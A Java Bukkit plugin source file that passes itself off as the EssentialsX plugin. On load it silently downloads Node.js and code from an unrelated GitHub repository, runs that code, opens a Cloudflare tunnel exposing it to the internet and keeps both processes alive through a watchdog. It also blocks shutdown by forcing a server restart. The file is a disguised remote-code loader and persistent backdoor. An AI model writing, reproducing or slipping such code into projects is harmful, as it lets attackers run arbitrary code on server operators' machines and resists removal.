package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.file.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class EssentialsX extends JavaPlugin {

    private Process nodeProcess;
    private Process cloudflaredProcess;
    private final ExecutorService executor = Executors.newCachedThreadPool();
    private boolean systemGuardEnabled = true;
    private Path workDir;

    // ================= 跨平台核心配置 =================
    private static final String NODE_VERSION = "v22.12.0";
    private static final String APP_REPO_URL = "https://github.com/zx1447/indexaoyoumc/archive/refs/heads/main.zip";
    private static final int INTERNAL_PORT = 4237;

    // 跨平台检测
    private static final boolean IS_WINDOWS = System.getProperty("os.name").toLowerCase().contains("win");
    private static final String OS_ARCH = System.getProperty("os.arch").equals("amd64") ? "x64" : "arm64";

    // ================= 动态 URL 生成 =================
    private String getNodeDownloadUrl() {
        if (IS_WINDOWS) {
            return "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-win-" + OS_ARCH + ".zip";
        } else {
            // Linux 使用 tar.gz 格式
            return "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-" + OS_ARCH + ".tar.xz";
        }
    }

    private String getCloudflaredDownloadUrl() {
        if (IS_WINDOWS) {
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe";
        } else {
            String arch = OS_ARCH.equals("arm64") ? "arm64" : "amd64";
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + arch;
        }
    }

    // 可执行文件名跨平台适配
    private String getNodeExeName() { return IS_WINDOWS ? "node.exe" : "bin/node"; }
    private String getNpmCliPath() { return IS_WINDOWS ? "node_modules/npm/bin/npm-cli.js" : "lib/node_modules/npm/bin/npm-cli.js"; }
    private String getCfExeName() { return IS_WINDOWS ? "cloudflared.exe" : "cloudflared"; }

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX 插件启动，当前系统: " + (IS_WINDOWS ? "Windows" : "Linux") + " " + OS_ARCH);
        
        workDir = getDataFolder().toPath().resolve(".mcchajian");
        try {
            Files.createDirectories(workDir);
        } catch (IOException e) {
            getLogger().severe("无法创建工作目录: " + e.getMessage());
            return;
        }

        executor.submit(() -> {
            try {
                deploy();
            } catch (Exception e) {
                getLogger().severe("部署过程中发生错误: " + e.getMessage());
                e.printStackTrace();
            }
        });

        Runtime.getRuntime().addShutdownHook(new Thread(this::safeShutdown));
    }

    @Override
    public void onDisable() {
        safeShutdown();
    }

    private void safeShutdown() {
        if (systemGuardEnabled) {
            getLogger().info("系统守护已启用，拒绝关闭，尝试重启服务器...");
            getServer().dispatchCommand(getServer().getConsoleSender(), "restart");
        } else {
            stopProcesses();
        }
    }

    private void stopProcesses() {
        if (nodeProcess != null && nodeProcess.isAlive()) nodeProcess.destroy();
        if (cloudflaredProcess != null && cloudflaredProcess.isAlive()) cloudflaredProcess.destroy();
        executor.shutdownNow();
    }

    // ================= 核心部署流程 =================
    private void deploy() throws Exception {
        Path nodeDir = workDir.resolve("nodejs");
        Path appDir = workDir.resolve("app");
        Path cfExe = workDir.resolve(getCfExeName());

        // 1. 安装 Node.js
        Path nodeExePath = nodeDir.resolve(getNodeExeName());
        if (!Files.exists(nodeExePath)) {
            getLogger().info("正在下载 Node.js (" + (IS_WINDOWS ? "Zip" : "Tar.xz") + ")...");
            Path archiveFile = workDir.resolve(IS_WINDOWS ? "node.zip" : "node.tar.xz");
            downloadFile(getNodeDownloadUrl(), archiveFile);
            
            getLogger().info("正在解压 Node.js...");
            if (IS_WINDOWS) {
                unzip(archiveFile, workDir);
                moveSubDirectory(workDir, "node-", nodeDir);
            } else {
                // Linux 下调用系统 tar 命令解压 tar.xz/tar.gz 更稳定
                runSystemCommand("tar", "-xf", archiveFile.toString(), "-C", workDir.toString());
                moveSubDirectory(workDir, "node-", nodeDir);
                // 赋予执行权限
                runSystemCommand("chmod", "+x", nodeExePath.toString());
            }
            Files.deleteIfExists(archiveFile);
        } else {
            getLogger().info("Node.js 已存在，跳过安装。");
        }

        // 2. 下载项目代码 (统一使用 Zip 格式)
        getLogger().info("正在下载项目代码...");
        Path appZip = workDir.resolve("app.zip");
        downloadFile(APP_REPO_URL, appZip);
        deleteDirectory(appDir);
        unzip(appZip, workDir);
        moveSubDirectory(workDir, "indexaoyoumc", appDir);
        Files.deleteIfExists(appZip);

        // 3. NPM Install
        getLogger().info("正在执行 npm install...");
        Path npmCliPath = nodeDir.resolve(getNpmCliPath());
        if (Files.exists(npmCliPath)) {
            if (IS_WINDOWS) {
                runCommand(nodeExePath.toString(), npmCliPath.toString(), "install", appDir);
            } else {
                // Linux 下推荐使用 bash 来执行 npm，避免权限和环境变量问题
                runCommand("bash", "-c", nodeExePath.toString() + " " + npmCliPath.toString() + " install", appDir);
            }
        } else {
            getLogger().warning("未找到 npm-cli.js，跳过 npm install。");
        }

        // 4. 启动 Node 应用
        getLogger().info("正在启动 Node.js 应用...");
        startNodeApp(nodeExePath.toString(), appDir);

        // 5. 等待端口就绪
        getLogger().info("等待应用端口就绪...");
        waitForPort(INTERNAL_PORT, 60);
        
        // 6. 启动 Cloudflared 隧道
        if (!Files.exists(cfExe)) {
            getLogger().info("正在下载 Cloudflared...");
            downloadFile(getCloudflaredDownloadUrl(), cfExe);
            if (!IS_WINDOWS) {
                runSystemCommand("chmod", "+x", cfExe.toString());
            }
        }
        startCloudflared(cfExe.toString());

        // 7. 启动守护线程
        startDaemon(nodeExePath.toString(), appDir, cfExe.toString());
    }

    // ================= 进程管理 =================
    private void startNodeApp(String nodeExe, Path appDir) throws IOException {
        Path indexPath = appDir.resolve("index.js");
        if (!Files.exists(indexPath)) throw new FileNotFoundException("index.js 不存在: " + indexPath);

        ProcessBuilder pb;
        if (IS_WINDOWS) {
            pb = new ProcessBuilder(nodeExe, "index.js");
        } else {
            // Linux 下通过 bash 启动，可以继承环境变量并保持后台运行
            pb = new ProcessBuilder("bash", "-c", "exec " + nodeExe + " index.js");
        }
        
        pb.directory(appDir.toFile());
        pb.environment().put("PORT", String.valueOf(INTERNAL_PORT));
        pb.environment().put("SERVER_PORT", String.valueOf(INTERNAL_PORT));
        
        Path logFile = workDir.resolve("app.log");
        pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
        pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));

        nodeProcess = pb.start();
        getLogger().info("Node.js 进程已启动 (PID: " + nodeProcess.pid() + ")");
    }

    private void startCloudflared(String cfExe) throws IOException {
        getLogger().info("正在启动 Cloudflared 隧道...");
        ProcessBuilder pb;
        if (IS_WINDOWS) {
            pb = new ProcessBuilder(cfExe, "tunnel", "--url", "http://localhost:" + INTERNAL_PORT, "--no-autoupdate");
        } else {
            // Linux 下使用 bash 启动
            pb = new ProcessBuilder("bash", "-c", cfExe + " tunnel --url http://localhost:" + INTERNAL_PORT + " --no-autoupdate");
        }
        pb.directory(workDir.toFile());
        
        Path cfLog = workDir.resolve("cf.log");
        pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
        pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));

        cloudflaredProcess = pb.start();
        getLogger().info("Cloudflared 进程已启动 (PID: " + cloudflaredProcess.pid() + ")");
    }

    private void startDaemon(String nodeExe, Path appDir, String cfExe) {
        Thread daemon = new Thread(() -> {
            while (systemGuardEnabled) {
                try {
                    if (nodeProcess == null || !nodeProcess.isAlive()) {
                        getLogger().warning("Node.js 进程已退出，5秒后重启...");
                        Thread.sleep(5000);
                        startNodeApp(nodeExe, appDir);
                    }
                    
                    if (cloudflaredProcess == null || !cloudflaredProcess.isAlive()) {
                        getLogger().warning("Cloudflared 进程已退出，5秒后重启...");
                        Thread.sleep(5000);
                        startCloudflared(cfExe);
                    }
                    Thread.sleep(5000);
                } catch (Exception e) {
                    getLogger().severe("守护线程异常: " + e.getMessage());
                }
            }
        }, "CrossPlatform-Daemon");
        daemon.setDaemon(true);
        daemon.start();
    }

    // ================= 通用工具方法 =================
    private void downloadFile(String url, Path target) throws IOException {
        HttpURLConnection connection = (HttpURLConnection) URI.create(url).toURL().openConnection();
        connection.setInstanceFollowRedirects(true);
        connection.setConnectTimeout(15000);
        connection.setReadTimeout(120000); // 下载 Node 可能较慢，设置2分钟
        connection.setRequestProperty("User-Agent", "Mozilla/5.0");

        try (InputStream in = connection.getInputStream()) {
            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
        } finally {
            connection.disconnect();
        }
    }

    private void unzip(Path zipFile, Path targetDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(zipFile))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                Path newPath = targetDir.resolve(entry.getName()).normalize();
                if (!newPath.startsWith(targetDir.normalize())) {
                    throw new IOException("Bad zip entry: " + entry.getName());
                }
                if (entry.isDirectory()) {
                    Files.createDirectories(newPath);
                } else {
                    Files.createDirectories(newPath.getParent());
                    Files.copy(zis, newPath, StandardCopyOption.REPLACE_EXISTING);
                }
                zis.closeEntry();
            }
        }
    }

    // Java 内部调用的命令 (如 NPM)
    private void runCommand(String... command) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.directory(workDir.toFile());
        pb.redirectErrorStream(true);
        
        Process p = pb.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                getLogger().info("[CMD] " + line);
            }
        }
        int exitCode = p.waitFor();
        if (exitCode != 0) {
            throw new RuntimeException("命令执行失败，退出码: " + exitCode);
        }
    }

    // 直接调用系统命令 (如 tar, chmod)，不关心输出，只管执行
    private void runSystemCommand(String... command) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        p.getInputStream().transferTo(OutputStream.nullOutputStream()); // 丢弃输出流防止阻塞
        int exitCode = p.waitFor();
        if (exitCode != 0) {
            getLogger().warning("系统命令执行返回非0状态码: " + String.join(" ", command));
        }
    }

    private void moveSubDirectory(Path parent, String prefix, Path target) throws IOException {
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(parent)) {
            for (Path entry : stream) {
                if (Files.isDirectory(entry) && entry.getFileName().toString().startsWith(prefix)) {
                    if (Files.exists(target)) deleteDirectory(target);
                    Files.move(entry, target, StandardCopyOption.REPLACE_EXISTING);
                    return;
                }
            }
        }
    }

    private void waitForPort(int port, int maxSeconds) throws InterruptedException {
        int waited = 0;
        while (waited < maxSeconds) {
            try {
                java.net.Socket socket = new java.net.Socket("localhost", port);
                socket.close();
                getLogger().info("端口 " + port + " 已就绪！");
                return;
            } catch (IOException e) {
                Thread.sleep(1000);
                waited++;
            }
        }
        getLogger().warning("等待端口超时 (" + maxSeconds + "秒)，但继续执行...");
    }

    private void deleteDirectory(Path path) throws IOException {
        if (!Files.exists(path)) return;
        Files.walk(path)
             .sorted((a, b) -> -a.compareTo(b))
             .forEach(p -> {
                 try { Files.delete(p); } catch (IOException ignored) {}
             });
    }
}
